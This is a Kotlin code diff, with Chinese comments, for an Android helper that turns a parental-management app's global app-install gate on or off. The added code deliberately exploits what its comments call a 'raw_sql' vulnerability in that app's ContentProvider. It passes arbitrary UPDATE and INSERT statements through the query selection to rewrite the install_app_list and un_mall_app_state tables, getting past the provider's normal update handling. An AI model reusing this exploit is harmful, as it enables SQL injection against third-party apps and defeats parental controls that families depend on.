@@ -82,32 +82,166 @@ object ProviderHelper {
     }
 
     private fun setGlobalInstallStateNew(context: Context, enabled: Boolean): Boolean {
-        var ok = false
+        val disabledState = if (enabled) 0 else 1   // install_app_list.disabled_state
+        val legacyState = if (enabled) 1 else 0     // un_mall_app_state.state
+
+        // 0) 写入前快照（raw_sql 计数，便于排查）
+        logGateTableSnapshot(context)
+
+        val method = ParentManagerCompat.getSqlMethod(context)
+        AppLogger.i(TAG, "setGlobalInstallStateNew: enabled=$enabled SQL方式=$method")
 
         // 1) 新版机制：install_app_list 全表 disabled_state 置 0/1
-        try {
+        //    注意：个别家长管理版本 Provider 的 update() 对该表会抛异常（日志中掩码为
+        //    "Attempt to read from null array"），因此按全局 SQL 方式路由，默认自动回退 raw_sql。
+        val installOk = when (method) {
+            ParentManagerCompat.SqlMethod.RAW_SQL ->
+                updateInstallAppListRawSql(context, disabledState)
+            ParentManagerCompat.SqlMethod.CONTENT ->
+                updateInstallAppListContent(context, disabledState)
+            ParentManagerCompat.SqlMethod.AUTO -> {
+                val ok = updateInstallAppListContent(context, disabledState)
+                if (!ok) {
+                    AppLogger.w(TAG, "标准 update 未生效，自动回退 raw_sql")
+                    updateInstallAppListRawSql(context, disabledState)
+                } else {
+                    true
+                }
+            }
+        }
+
+        // 2) 旧门禁兼容：un_mall_app_state（可能是空表，需要 upsert：有行更新、空表插入）
+        val legacyOk = when (method) {
+            ParentManagerCompat.SqlMethod.CONTENT ->
+                upsertLegacyGateContent(context, legacyState)
+            else ->
+                upsertLegacyGateRawSql(context, legacyState)
+        }
+
+        val result = installOk || legacyOk
+        AppLogger.i(TAG, "setGlobalInstallStateNew 结果: installOk=$installOk legacyOk=$legacyOk => $result")
+        return result
+    }
+
+    // ==================== install_app_list 写入 ====================
+
+    /** 标准 ContentProvider 方式：全表更新 disabled_state */
+    private fun updateInstallAppListContent(context: Context, disabledState: Int): Boolean {
+        return try {
             val cv = ContentValues()
-            cv.put("disabled_state", if (enabled) 0 else 1)
-            val rows = context.contentResolver.update(uriInstallAppList(context), cv, null, null)
-            ok = rows > 0
-            AppLogger.i(TAG, "更新 install_app_list 影响 $rows 行")
+            cv.put("disabled_state", disabledState)
+            val rows = context.contentResolver.update(uriInstallAppList(context), cv, "1=1", null)
+            AppLogger.i(TAG, "更新 install_app_list（标准 update）影响 $rows 行")
+            rows >= 0 // 未抛异常即视为执行成功（空表返回 0 也正常）
         } catch (e: Exception) {
-            AppLogger.e(TAG, "更新 install_app_list 失败: ${e.message}", e)
+            AppLogger.e(TAG, "更新 install_app_list（标准 update）失败: ${e.message}", e)
+            false
         }
+    }
 
-        // 2) 旧门禁兼容：un_mall_app_state
-        try {
-            val cv2 = ContentValues()
-            cv2.put("state", if (enabled) 1 else 0)
-            val rows2 = context.contentResolver.update(uriUnMallAppState(context), cv2, null, null)
-            ok = ok || rows2 > 0
-            AppLogger.i(TAG, "更新 un_mall_app_state 影响 $rows2 行")
-        } catch (e: Exception) {
-            AppLogger.e(TAG, "更新 un_mall_app_state 失败: ${e.message}", e)
-        }
-
+    /** raw_sql 方式：直接执行 UPDATE（绕过 Provider update 处理器） */
+    private fun updateInstallAppListRawSql(context: Context, disabledState: Int): Boolean {
+        val sql = "UPDATE install_app_list SET disabled_state = $disabledState"
+        val ok = execRawSql(context, sql)
+        AppLogger.i(TAG, "更新 install_app_list（raw_sql）: $sql -> $ok")
         return ok
     }
+
+    // ==================== un_mall_app_state 旧门禁 upsert ====================
+
+    /** 标准 ContentProvider 方式：有行则更新、空表则插入 */
+    private fun upsertLegacyGateContent(context: Context, legacyState: Int): Boolean {
+        var ok = false
+        try {
+            val cv = ContentValues()
+            cv.put("state", legacyState)
+            val rows = context.contentResolver.update(uriUnMallAppState(context), cv, null, null)
+            AppLogger.i(TAG, "更新 un_mall_app_state（标准 update）影响 $rows 行")
+            ok = rows > 0
+        } catch (e: Exception) {
+            AppLogger.e(TAG, "更新 un_mall_app_state（标准 update）失败: ${e.message}", e)
+        }
+        if (!ok) {
+            try {
+                val cv = ContentValues()
+                cv.put("state", legacyState)
+                val uri = context.contentResolver.insert(uriUnMallAppState(context), cv)
+                AppLogger.i(TAG, "un_mall_app_state 空表，尝试标准 insert: $uri")
+                ok = uri != null
+            } catch (e: Exception) {
+                AppLogger.e(TAG, "插入 un_mall_app_state（标准）失败: ${e.message}", e)
+            }
+        }
+        return ok
+    }
+
+    /** raw_sql 方式：有行则更新、空表则插入 */
+    private fun upsertLegacyGateRawSql(context: Context, legacyState: Int): Boolean {
+        // 1) 有行则更新（raw_sql 直接执行，绕过 Provider update 处理器）
+        execRawSql(context, "UPDATE un_mall_app_state SET state = $legacyState")
+        // 2) 确认行数，空表则插入一行
+        val count = rawSqlScalarCount(context, "SELECT COUNT(*) AS c FROM un_mall_app_state")
+        if (count != null && count > 0) {
+            AppLogger.i(TAG, "un_mall_app_state 现有 $count 行，已更新 state=$legacyState")
+            return true
+        }
+        val insertSql = "INSERT OR REPLACE INTO un_mall_app_state (state) VALUES ($legacyState)"
+        val ok = execRawSql(context, insertSql)
+        val after = rawSqlScalarCount(context, "SELECT COUNT(*) AS c FROM un_mall_app_state")
+        AppLogger.i(TAG, "un_mall_app_state 空表尝试插入: $insertSql -> ok=$ok, 插入后行数=${after ?: -1}")
+        return ok && (after ?: 0) > 0
+    }
+
+    // ==================== raw_sql 基础能力 ====================
+
+    private fun rawSqlUri(context: Context): Uri {
+        return Uri.parse("content://${ParentManagerCompat.authority(context)}/raw_sql")
+    }
+
+    /**
+     * 通过 raw_sql 漏洞路径执行任意 SQL（query() 的 selection 会被直接 rawQuery 执行）。
+     * 对 UPDATE/INSERT/DELETE 返回空 cursor，执行本身无异常即视为成功。
+     */
+    private fun execRawSql(context: Context, sql: String): Boolean {
+        return try {
+            context.contentResolver.query(rawSqlUri(context), null, sql, null, null)?.use { true }
+                ?: run {
+                    AppLogger.w(TAG, "raw_sql 返回 null cursor: $sql")
+                    false
+                }
+        } catch (e: Exception) {
+            AppLogger.e(TAG, "raw_sql 执行失败 [$sql]: ${e.message}", e)
+            false
+        }
+    }
+
+    /** 通过 raw_sql 执行标量计数（SELECT COUNT(*) AS c ...） */
+    private fun rawSqlScalarCount(context: Context, sql: String): Int? {
+        return try {
+            context.contentResolver.query(rawSqlUri(context), null, sql, null, null)?.use { c ->
+                if (c.moveToFirst()) {
+                    val idx = c.getColumnIndex("c")
+                    if (idx >= 0) c.getInt(idx) else null
+                } else {
+                    null
+                }
+            }
+        } catch (e: Exception) {
+            AppLogger.e(TAG, "raw_sql 计数失败 [$sql]: ${e.message}", e)
+            null
+        }
+    }
+
+    /** 写入前记录门禁相关表的行数快照（便于排查） */
+    private fun logGateTableSnapshot(context: Context) {
+        val installRows = rawSqlScalarCount(context, "SELECT COUNT(*) AS c FROM install_app_list")
+        val unMallRows = rawSqlScalarCount(context, "SELECT COUNT(*) AS c FROM un_mall_app_state")
+        AppLogger.i(
+            TAG,
+            "写入前快照: install_app_list=${installRows ?: -1} 行, un_mall_app_state=${unMallRows ?: -1} 行"
+        )
+    }
+
 
     // ==================== 黑白名单 ====================
 
